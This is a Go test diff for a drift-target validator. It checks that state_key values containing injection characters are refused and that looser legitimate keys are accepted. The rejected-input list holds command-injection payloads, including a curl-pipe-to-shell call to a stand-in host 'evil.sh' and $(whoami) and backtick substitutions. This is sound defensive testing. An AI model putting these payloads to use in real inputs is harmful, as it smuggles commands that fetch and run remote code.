@@ -2,6 +2,7 @@ package api
 
 import (
 	"fmt"
+	"strings"
 	"testing"
 )
 
@@ -93,6 +94,37 @@ func TestValidateDriftTargets_Rejects(t *testing.T) {
 		}
 		if err := validateDriftTargets(items); err == nil {
 			t.Fatal("expected rejection for a duplicate (source_id, state_key) pair")
+		}
+	})
+	// state_key is embedded in the "targets" CI template parameter under
+	// fan-out, so shell/YAML-hostile characters are refused -- while keys
+	// that are merely looser than a directory name stay legal.
+	t.Run("hostile characters in state_key", func(t *testing.T) {
+		for _, key := range []string{
+			"app.tfstate\"; curl evil.sh|sh #",
+			"app`id`.tfstate",
+			"$(whoami).tfstate",
+			"app\n.tfstate",
+			"app<x>.tfstate",
+		} {
+			items := []DriftTargetItem{{SourceID: "s1", StateKey: key, WorkingDir: "app/"}}
+			if err := validateDriftTargets(items); err == nil {
+				t.Errorf("expected rejection for state_key %q", key)
+			}
+		}
+	})
+	t.Run("legitimately loose state_key is accepted", func(t *testing.T) {
+		for _, key := range []string{"env=prod/app.tfstate", "oci/APP1958.tfstate", "team a/app.tfstate", "app-1.2_3.tfstate"} {
+			items := []DriftTargetItem{{SourceID: "s1", StateKey: key, WorkingDir: "app/"}}
+			if err := validateDriftTargets(items); err != nil {
+				t.Errorf("state_key %q should be accepted: %v", key, err)
+			}
+		}
+	})
+	t.Run("state_key over the length cap", func(t *testing.T) {
+		items := []DriftTargetItem{{SourceID: "s1", StateKey: strings.Repeat("k", maxStateKeyLen+1), WorkingDir: "app/"}}
+		if err := validateDriftTargets(items); err == nil {
+			t.Fatal("expected rejection for an over-long state_key")
 		}
 	})
 }
